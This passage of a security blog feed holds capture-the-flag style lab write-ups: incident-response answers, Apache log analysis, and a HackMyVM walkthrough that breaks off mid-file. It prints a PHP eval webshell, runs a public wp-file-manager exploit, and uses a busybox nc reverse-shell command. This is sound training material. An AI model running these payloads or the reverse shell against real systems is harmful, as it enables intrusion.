class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">iptables -I INPUT -p tcp -m state --state NEW -m tcp --dport 20 -j ACCEPT</span><br><span class="line">                       iptables -I INPUT -p tcp -m state --state NEW -m tcp --dport 21 -j ACCEPT</span><br><span class="line">                       iptables -I INPUT -p tcp -m state --state NEW -m tcp --dport 22 -j ACCEPT</span><br><span class="line">                       iptables -I INPUT -p tcp -m state --state NEW -m tcp --dport 80 -j ACCEPT</span><br><span class="line">                       iptables -I INPUT -p tcp -m state --state NEW -m tcp --dport 443 -j ACCEPT</span><br><span class="line">                       iptables -I INPUT -p tcp -m state --state NEW -m tcp --dport <span class="variable">$&#123;panelPort&#125;</span> -j ACCEPT</span><br><span class="line">                       iptables -I INPUT -p tcp -m state --state NEW -m tcp --dport <span class="variable">$&#123;sshPort&#125;</span> -j ACCEPT</span><br><span class="line">                       iptables -I INPUT -p tcp -m state --state NEW -m tcp --dport 39000:40000 -j ACCEPT</span><br><span class="line">                       <span class="comment">#iptables -I INPUT -p tcp -m state --state NEW -m udp --dport 39000:40000 -j ACCEPT</span></span><br><span class="line">                       iptables -A INPUT -p icmp --icmp-type any -j ACCEPT</span><br><span class="line">                       iptables -A INPUT -s localhost -d localhost -j ACCEPT</span><br><span class="line">                       iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT</span><br><span class="line">                       iptables -P INPUT DROP</span><br><span class="line">                       service iptables save</span><br><span class="line">                       sed -i <span class="string">&quot;s#IPTABLES_MODULES=\&quot;\&quot;#IPTABLES_MODULES=\&quot;ip_conntrack_netbios_ns ip_conntrack_ftp ip_nat_ftp\&quot;#&quot;</span> /etc/sysconfig/iptables-config</span><br><span class="line">                       iptables_status=$(service iptables status | grep <span class="string">&#x27;not running&#x27;</span>)</span><br><span class="line">                       <span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$&#123;iptables_status&#125;</span>&quot;</span> == <span class="string">&#x27;&#x27;</span> ];<span class="keyword">then</span></span><br><span class="line">                               service iptables restart</span><br><span class="line">                       <span class="keyword">fi</span></span><br><span class="line">               <span class="keyword">else</span></span><br><span class="line">                       AliyunCheck=$(<span class="built_in">cat</span> /etc/redhat-release|grep <span class="string">&quot;Aliyun Linux&quot;</span>)</span><br><span class="line">                       [ <span class="string">&quot;<span class="variable">$&#123;AliyunCheck&#125;</span>&quot;</span> ] &amp;&amp; <span class="built_in">return</span></span><br><span class="line">                       yum install firewalld -y</span><br><span class="line">                       [ <span class="string">&quot;<span class="variable">$&#123;Centos8Check&#125;</span>&quot;</span> ] &amp;&amp; yum reinstall python3-six -y</span><br><span class="line">                       systemctl <span class="built_in">enable</span> firewalld</span><br><span class="line">                       systemctl start firewalld</span><br><span class="line">                       firewall-cmd --set-default-zone=public &gt; /dev/null 2&gt;&amp;1</span><br><span class="line">                       firewall-cmd --permanent --zone=public --add-port=20/tcp &gt; /dev/null 2&gt;&amp;1</span><br><span class="line">                       firewall-cmd --permanent --zone=public --add-port=21/tcp &gt; /dev/null 2&gt;&amp;1</span><br><span class="line">                       firewall-cmd --permanent --zone=public --add-port=22/tcp &gt; /dev/null 2&gt;&amp;1</span><br><span class="line">                       firewall-cmd --permanent --zone=public --add-port=80/tcp &gt; /dev/null 2&gt;&amp;1</span><br><span class="line">                       firewall-cmd --permanent --zone=public --add-port=443/tcp &gt; /dev/null 2&gt;&amp;1</span><br><span class="line">                       firewall-cmd --permanent --zone=public --add-port=<span class="variable">$&#123;panelPort&#125;</span>/tcp &gt; /dev/null 2&gt;&amp;1</span><br><span class="line">                       firewall-cmd --permanent --zone=public --add-port=<span class="variable">$&#123;sshPort&#125;</span>/tcp &gt; /dev/null 2&gt;&amp;1</span><br><span class="line">                       firewall-cmd --permanent --zone=public --add-port=39000-40000/tcp &gt; /dev/null 2&gt;&amp;1</span><br><span class="line">                       <span class="comment">#firewall-cmd --permanent --zone=public --add-port=39000-40000/udp &gt; /dev/null 2&gt;&amp;1</span></span><br><span class="line">                       firewall-cmd --reload</span><br></pre></td></tr></table></figure><p>ss -lntup是用来查看当前系统中监听中的端口（sockets）及其相关信息。</p><ul><li>-l    只显示监听（listening）状态的端口</li><li>-n显示数字地址和端口（不解析域名和服务名）——更快更清晰</li><li>-t显示 TCP 协议的连接</li><li>-u显示 UDP 协议的连接</li><li>-p显示哪个进程在使用这个端口（需要 root 权限查看完整信息）<br>即flag{81}</li></ul><h2 id="第二题"><a href="#第二题" class="headerlink" title="第二题"></a>第二题</h2><p>在&#x2F;www&#x2F;wwwlogs发现网站日志access.log，打开后会发现很多来nmap的探测</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">192.168.83.128 - - [18/Nov/2024:22:15:23 +0800] <span class="string">&quot;GET /status.jsp HTTP/1.1&quot;</span> 404 146 <span class="string">&quot;-&quot;</span> <span class="string">&quot;Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)&quot;</span></span><br><span class="line">192.168.83.128 - - [18/Nov/2024:22:15:23 +0800] <span class="string">&quot;GET /tasktracker.jsp HTTP/1.1&quot;</span> 404 146 <span class="string">&quot;-&quot;</span> <span class="string">&quot;Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)&quot;</span></span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>即flag{nmap}</p><h2 id="第三题"><a href="#第三题" class="headerlink" title="第三题"></a>第三题</h2><p>同样在&#x2F;www&#x2F;wwwlogs还有一个127.0.0.1.log，打开就会发现很多gobuster的扫目录的记录。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">192.168.83.1 - - [19/Nov/2024:22:53:48 +0800] <span class="string">&quot;GET /~test HTTP/1.1&quot;</span> 404 479 <span class="string">&quot;-&quot;</span> <span class="string">&quot;gobuster/3.6&quot;</span></span><br><span class="line">192.168.83.1 - - [19/Nov/2024:22:53:48 +0800] <span class="string">&quot;GET /~tmp HTTP/1.1&quot;</span> 404 479 <span class="string">&quot;-&quot;</span> <span class="string">&quot;gobuster/3.6&quot;</span></span><br><span class="line">192.168.83.1 - - [19/Nov/2024:22:53:48 +0800] <span class="string">&quot;GET /~user HTTP/1.1&quot;</span> 404 479 <span class="string">&quot;-&quot;</span> <span class="string">&quot;gobuster/3.6&quot;</span></span><br><span class="line">192.168.83.1 - - [19/Nov/2024:22:53:48 +0800] <span class="string">&quot;GET /~webmaster HTTP/1.1&quot;</span> 404 479 <span class="string">&quot;-&quot;</span> <span class="string">&quot;gobuster/3.6&quot;</span></span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>即flag{gobuster&#x2F;3.6}</p><h2 id="第四题"><a href="#第四题" class="headerlink" title="第四题"></a>第四题</h2><p>成功登录后台的IP地址猜测应该是来自gobuster扫描的地址，他发送的是http请求。<br>flag{192.168.83.1}</p><h2 id="第五题"><a href="#第五题" class="headerlink" title="第五题"></a>第五题</h2><p>一般一句话木马应该存在于www目录的一个php文件里，能够被网站访问且解析php文件<br>最终在&#x2F;www&#x2F;wwwroot&#x2F;jizhi&#x2F;index.php中发现一句话木马，密码为Admin@@</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">//定义项目模型文件目录</span><br><span class="line">define(&#x27;HOME_MODEL&#x27;,&#x27;m&#x27;);</span><br><span class="line"></span><br><span class="line">eval($_POST[&quot;Admin@@&quot;]);</span><br><span class="line"></span><br><span class="line">//定义项目默认方法</span><br><span class="line">define(&#x27;DefaultAction&#x27;,&#x27;jizhi&#x27;);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>flag{Admin@@}</p><h2 id="第六题"><a href="#第六题" class="headerlink" title="第六题"></a>第六题</h2><p>最后要找黑客留下的后门文件，最终在&#x2F;tmp下发现一个index.elf的二进制文件。猜测应该是这个。<br>目前我还没找到咋把文件传下来，因为网络不通，这里后续更新。<br>看网上文章确实是这个文件。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[root@ip-10-0-10-7 tmp]# ls</span><br><span class="line">index.elf               sess_371d72f4d9apvoh6q7o4e58qm4                                          vmware-root_672-2722828807</span><br><span class="line">last_files_set_mode.pl  sess_5g6h04hq3ihphgn3d28o4sr20a                                          vmware-root_674-2731152261</span><br><span class="line">mysql.sock              sess_g10imn6kgucafbr205laul8m2s                                          vmware-root_681-4022243287</span><br><span class="line">panelSpeed.pl           systemd-private-5919622bbb2e42d487775f0812e3efe5-chronyd.service-yXNDQG  vmware-root_689-4021587913</span><br><span class="line">php-cgi-73.sock         systemd-private-bf83dd62b18f4f6abc660c77f3ace5ec-chronyd.service-ZstlR0  vmware-root_691-4013264459</span><br><span class="line">php-cgi-74.sock         unzip.log</span><br></pre></td></tr></table></figure><p>flag{&#x2F;tmp&#x2F;index.elf}</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;任务&quot;&gt;&lt;a href=&quot;#任务&quot; class=&quot;headerlink&quot; title=&quot;任务&quot;&gt;&lt;/a&gt;任务&lt;/h2&gt;&lt;p&gt;1、黑客是从哪个端口作为入口点的&lt;br&gt;2、黑客使用了什么工具探测了ssh服务&lt;br&gt;3、黑客使用了什么工具扫描了目录（格式flag{工具&amp;</summary>
      
    
    
    
    <category term="应急响应" scheme="https://lontan0.github.io/categories/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"/>
    
    
    <category term="玄机" scheme="https://lontan0.github.io/tags/%E7%8E%84%E6%9C%BA/"/>
    
    <category term="应急响应" scheme="https://lontan0.github.io/tags/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"/>
    
  </entry>
  
  <entry>
    <title>玄机-第一章日志分析-apache日志分析</title>
    <link href="https://lontan0.github.io/2025/07/06/%E7%8E%84%E6%9C%BA-%E7%AC%AC%E4%B8%80%E7%AB%A0%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90-apache%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/"/>
    <id>https://lontan0.github.io/2025/07/06/%E7%8E%84%E6%9C%BA-%E7%AC%AC%E4%B8%80%E7%AB%A0%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90-apache%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/</id>
    <published>2025-07-06T02:36:53.000Z</published>
    <updated>2025-07-06T02:39:59.751Z</updated>
    
    <content type="html"><![CDATA[<h2 id="任务"><a href="#任务" class="headerlink" title="任务"></a>任务</h2><p>1、提交当天访问次数最多的IP，即黑客IP：<br>2、黑客使用的浏览器指纹是什么，提交指纹的md5：<br>3、查看包含index.php页面被访问的次数，提交次数：<br>4、查看黑客IP访问了多少次，提交次数：<br>5、查看2023年8月03日8时这一个小时内有多少IP访问，提交次数:</p><p>apache的日志一般在&#x3D;&#x3D;&#x2F;var&#x2F;log&#x2F;apache2&#x3D;&#x3D;或者&#x3D;&#x3D;&#x2F;var&#x2F;log&#x2F;httpd&#x3D;&#x3D;</p><h2 id="第一题"><a href="#第一题" class="headerlink" title="第一题"></a>第一题</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">root@ip-10-0-10-2:~# <span class="built_in">cd</span> /var/log/apache2</span><br><span class="line">root@ip-10-0-10-2:/var/log/apache2# <span class="built_in">ls</span> -la</span><br><span class="line">total 1424</span><br><span class="line">drwxr-x--- 2 root adm     4096 Jul  5 14:51 .</span><br><span class="line">drwxr-xr-x 8 root root    4096 Jul  5 14:51 ..</span><br><span class="line">-rw-r----- 1 root adm        0 Jul  5 14:51 access.log</span><br><span class="line">-rw-r----- 1 root adm  1355381 Aug  3  2023 access.log.1</span><br><span class="line">-rw-r----- 1 root adm      239 Jul  5 14:51 error.log</span><br><span class="line">-rw-r----- 1 root adm    88555 Aug  3  2023 error.log.1</span><br><span class="line">-rw-r----- 1 root adm        0 Aug  2  2023 other_vhosts_access.log</span><br></pre></td></tr></table></figure><p>可以看到访问日志（access.log.1）和错误日志（error.log.1）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> access.log.1</span><br><span class="line">192.168.200.2 - - [03/Aug/2023:08:46:45 +0000] <span class="string">&quot;GET /id_rsa HTTP/1.1&quot;</span> 404 492 <span class="string">&quot;-&quot;</span> <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36&quot;</span></span><br></pre></td></tr></table></figure><p>打开一看，有很多访问记录，第一个字段就是IP，可以利用awk筛选出来第一个字段，全是这个IP</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">awk <span class="string">&#x27;&#123;print $1&#125;&#x27;</span> access.log.1</span><br></pre></td></tr></table></figure><p>即flag{192.168.200.2}</p><h2 id="第二题"><a href="#第二题" class="headerlink" title="第二题"></a>第二题</h2><p>浏览器指纹（User-Agent）就是上面那一条日志最后一个字段</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> -n <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36&quot;</span> | <span class="built_in">md5sum</span></span><br><span class="line">2d6330f380f44ac20f3a02eed0958f66</span><br></pre></td></tr></table></figure><p>即flag{2d6330f380f44ac20f3a02eed0958f66}</p><h2 id="第三题"><a href="#第三题" class="headerlink" title="第三题"></a>第三题</h2><p>查看包含index.php页面被访问的次数，直接用grep筛选出来然后利用wc统计</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">grep <span class="string">&quot;/index.php&quot;</span> access.log.1 | <span class="built_in">wc</span> -l</span><br><span class="line">27</span><br></pre></td></tr></table></figure><p>利用grep筛选出来access.log.1中包含&#x2F;index.php的，然后wc -l是统计多少行。<br>但是提交不对，然后不统计筛选出来一条条看，会发现这两条日志，显然不是访问的&#x2F;index.php。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">192.168.200.2 - - [03/Aug/2023:08:27:09 +0000] <span class="string">&quot;GET /template/taoCMS/images/tao.js HTTP/1.1&quot;</span> 200 1430 <span class="string">&quot;http://192.168.200.51/index.php&quot;</span> <span class="string">&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/115.0&quot;</span></span><br><span class="line"></span><br><span class="line">192.168.200.2 - - [03/Aug/2023:08:27:58 +0000] <span class="string">&quot;GET /template/taoCMS/images/tao.js HTTP/1.1&quot;</span> 200 1430 <span class="string">&quot;http://192.168.200.51/index.php&quot;</span> <span class="string">&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/115.0&quot;</span></span><br></pre></td></tr></table></figure><p>即flag{25}</p><h2 id="第四题"><a href="#第四题" class="headerlink" title="第四题"></a>第四题</h2><p>查看黑客IP访问了多少次，依然是用grep筛选出来然后利用wc -l统计</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">grep <span class="string">&quot;192.168.200.2 - - &quot;</span> access.log.1 | <span class="built_in">wc</span> -l</span><br><span class="line">6555</span><br></pre></td></tr></table></figure><p>这里注意直接筛选192.168.200.2的话可能会有别的ip，例如192.168.200.202</p><p>即flag{6555}</p><h2 id="第五题"><a href="#第五题" class="headerlink" title="第五题"></a>第五题</h2><p>查看2023年8月03日8时这一个小时内有多少IP访问</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">grep <span class="string">&quot;03/Aug/2023:08&quot;</span> access.log.1 | awk <span class="string">&#x27;&#123;print $1&#125;&#x27;</span> | <span class="built_in">sort</span> | <span class="built_in">uniq</span> | <span class="built_in">wc</span> -l</span><br><span class="line">5</span><br></pre></td></tr></table></figure><p>即flag{5}</p><p>先筛选出来时间，然后打印第一个字段，然后sort是排序，uniq是去重，最后利用wc -l统计数量。</p><h2 id="补充和总结"><a href="#补充和总结" class="headerlink" title="补充和总结"></a>补充和总结</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">grep <span class="string">&quot;03/Aug/2023:08&quot;</span> access.log.1 | awk <span class="string">&#x27;&#123;print $1&#125;&#x27;</span> | <span class="built_in">sort</span> | <span class="built_in">uniq</span> -c</span><br><span class="line"></span><br><span class="line">  29 ::1</span><br><span class="line">6555 192.168.200.2</span><br><span class="line">   1 192.168.200.211</span><br><span class="line">   5 192.168.200.38</span><br><span class="line">   1 192.168.200.48</span><br></pre></td></tr></table></figure><p>这样可以看的更清晰，筛选出来了该时间段内的IP地址及访问次数。</p><ul><li>sort是排序的</li><li>uniq 是去重的，加上-c是统计重复数量</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;任务&quot;&gt;&lt;a href=&quot;#任务&quot; class=&quot;headerlink&quot; title=&quot;任务&quot;&gt;&lt;/a&gt;任务&lt;/h2&gt;&lt;p&gt;1、提交当天访问次数最多的IP，即黑客IP：&lt;br&gt;2、黑客使用的浏览器指纹是什么，提交指纹的md5：&lt;br&gt;3、查看包含index.php</summary>
      
    
    
    
    <category term="应急响应" scheme="https://lontan0.github.io/categories/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"/>
    
    
    <category term="玄机" scheme="https://lontan0.github.io/tags/%E7%8E%84%E6%9C%BA/"/>
    
    <category term="应急响应" scheme="https://lontan0.github.io/tags/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"/>
    
  </entry>
  
  <entry>
    <title>hackmyvm-vulny</title>
    <link href="https://lontan0.github.io/2025/07/03/hackmyvm-vulny/"/>
    <id>https://lontan0.github.io/2025/07/03/hackmyvm-vulny/</id>
    <published>2025-07-03T15:41:11.000Z</published>
    <updated>2025-07-03T15:43:37.542Z</updated>
    
    <content type="html"><![CDATA[<h2 id="一、端口扫描"><a href="#一、端口扫描" class="headerlink" title="一、端口扫描"></a>一、端口扫描</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nmap 192.168.56.106</span><br><span class="line">80/tcp open  http</span><br></pre></td></tr></table></figure><p>只开放了80端口</p><h2 id="二、目录扫描与路径枚举"><a href="#二、目录扫描与路径枚举" class="headerlink" title="二、目录扫描与路径枚举"></a>二、目录扫描与路径枚举</h2><p>直接访问 <code>http://192.168.56.106</code> 显示 Ubuntu 默认页面。</p><p>使用 gobuster 扫描：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gobuster <span class="built_in">dir</span> -u http://192.168.56.106 -w /usr/share/wordlists/dirb/common.txt -x php,txt -t 50</span><br><span class="line"></span><br><span class="line">/secret               (Status: 301)  [Size: 317]  [--&gt; http://192.168.56.106/secret/]</span><br></pre></td></tr></table></figure><p>进一步扫描：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">gobuster <span class="built_in">dir</span> -u http://192.168.56.106/secret -w /usr/share/wordlists/dirb/common.txt -x php,txt -t 50</span><br><span class="line"></span><br><span class="line">/wp-admin             (Status: 301) [Size: 326]  [--&gt; http://192.168.56.106/secret/wp-admin/]</span><br><span class="line">/wp-includes          (Status: 301) [Size: 329]  [--&gt; http://192.168.56.106/secret/wp-includes/]</span><br><span class="line">/wp-content           (Status: 301) [Size: 328]  [--&gt; http://192.168.56.106/secret/wp-content/]</span><br><span class="line">/wp-settings.php      (Status: 500) [Size: 0]</span><br></pre></td></tr></table></figure><p>访问&#x2F;secret发现是一个wordpress服务，并且报错</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Neither /etc/wordpress/config-192.168.56.106.php nor /etc/wordpress/config-168.56.106.php could be found.</span><br><span class="line">Ensure one of them exists, is readable by the webserver and contains the right password/username.</span><br></pre></td></tr></table></figure><h2 id="三、插件泄露与漏洞利用"><a href="#三、插件泄露与漏洞利用" class="headerlink" title="三、插件泄露与漏洞利用"></a>三、插件泄露与漏洞利用</h2><p>跟进访问：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.56.106/secret/wp-content/uploads/2020/10/</span><br></pre></td></tr></table></figure><p>发现插件包并且确定版本6.0：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wp-file-manager-6.0.zip</span><br></pre></td></tr></table></figure><p>这是 WordPress 的插件 <code>wp-file-manager</code>，存在 CVE-2020-25213：</p><blockquote><p><code>wp-file-manager &lt;= 6.8</code> 存在未授权文件上传漏洞，可远程命令执行。</p></blockquote><p>使用 <code>searchsploit</code> 查找漏洞利用：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">searchsploit wp-file-manager</span><br><span class="line">searchsploit -m php/webapps/51224.py</span><br><span class="line">python3 51224.py http://192.168.56.106/secret <span class="built_in">id</span></span><br><span class="line">uid=33(www-data) gid=33(www-data) <span class="built_in">groups</span>=33(www-data)</span><br></pre></td></tr></table></figure><p>漏洞利用成功，之后反弹shell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 51224.py http://192.168.56.106/secret <span class="string">&quot;busybox nc 192.168.56.102 6666 -e sh&quot;</span></span><br></pre></td></tr></table></figure><h2 id="四、信息收集"><a href="#四、信息收集" class="headerlink" title="四、信息收集"></a>四、信息收集</h2><p>前面报错&#x2F;etc&#x2F;wordpress路径，然后看一下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">www-data@vulny:/etc/wordpress$ <span class="built_in">ls</span></span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line">config-192.168.1.122.php  htaccess</span><br><span class="line">www-data@vulny:/etc/wordpress$ <span class="built_in">cat</span> config-192.168.1.122.php</span><br><span class="line"><span class="built_in">cat</span> config-192.168.1.122.php</span><br><span class="line">&lt;?php</span><br><span class="line">define(<span class="string">&#x27;DB_NAME&#x27;</span>, <span class="string">&#x27;wordpress&#x27;</span>);</span><br><span class="line">define(<span class="string">&#x27;DB_USER&#x27;</span>, <span class="string">&#x27;wordpress&#x27;</span>);</span><br><span class="line">define(<span class="string">&#x27;DB_PASSWORD&#x27;</span>, <span class="string">&#x27;myfuckingpassword&#x27;</span>);</span><br><span class="line">define(<span class="string">&#x27;DB_HOST&#x27;</span>, <span class="string">&#x27;localhost&#x27;</span>);</span><br><span class="line">define(<span class="string">&#x27;DB_COLLATE&#x27;</span>, <span class="string">&#x27;utf8_general_ci&#x27;</span>);</span><br><span class="line">define(<span class="string">&#x27;WP_CONTENT_DIR&#x27;</span>, <span class="string">&#x27;/usr/share/wordpress/wp-content&#x27;</span>);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>然后看wordpress的配置文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /usr/share/wordpress/wp-config.php</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/***</span></span><br><span class="line"><span class="comment"> * WordPress&#x27;s Debianised default master config file</span></span><br><span class="line"><span class="comment"> * Please do NOT edit and learn how the configuration works in</span></span><br><span class="line"><span class="comment"> * /usr/share/doc/wordpress/README.Debian</span></span><br><span class="line"><span class="comment"> ***/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Look up a host-specific config file in</span></span><br><span class="line"><span class="comment"> * /etc/wordpress/config-&lt;host&gt;.php or /etc/wordpress/config-&lt;domain&gt;.php</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="variable">$debian_server</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/:.*/&#x27;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_HOST&#x27;</span>]);</span><br><span class="line"><span class="variable">$debian_server</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;/[^a-zA-Z0-9.\-]/&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$debian_server</span>);</span><br><span class="line"><span class="variable">$debian_file</span> = <span class="string">&#x27;/etc/wordpress/config-&#x27;</span>.<span class="title function_ invoke__">strtolower</span>(<span class="variable">$debian_server</span>).<span class="string">&#x27;.php&#x27;</span>;</span><br><span class="line"><span class="comment">/* Main site in case of multisite with subdomains */</span></span><br><span class="line"><span class="variable">$debian_main_server</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;/^[^.]*\./&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$debian_server</span>);</span><br><span class="line"><span class="variable">$debian_main_file</span> = <span class="string">&#x27;/etc/wordpress/config-&#x27;</span>.<span class="title function_ invoke__">strtolower</span>(<span class="variable">$debian_main_server</span>).<span class="string">&#x27;.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="variable">$debian_file</span>)) &#123;</span><br><span class="line">    <span class="keyword">require_once</span>(<span class="variable">$debian_file</span>);</span><br><span class="line">    <span class="title function_ invoke__">define</span>(<span class="string">&#x27;DEBIAN_FILE&#x27;</span>, <span class="variable">$debian_file</span>);</span><br><span class="line">&#125; <span class="keyword">elseif</span> (<span class="title function_ invoke__">file_exists</span>(<span class="variable">$debian_main_file</span>)) &#123;</span><br><span class="line">    <span class="keyword">require_once</span>(<span class="variable">$debian_main_file</span>);</span><br><span class="line">    <span class="title function_ invoke__">define</span>(<span class="string">&#x27;DEBIAN_FILE&#x27;</span>, <span 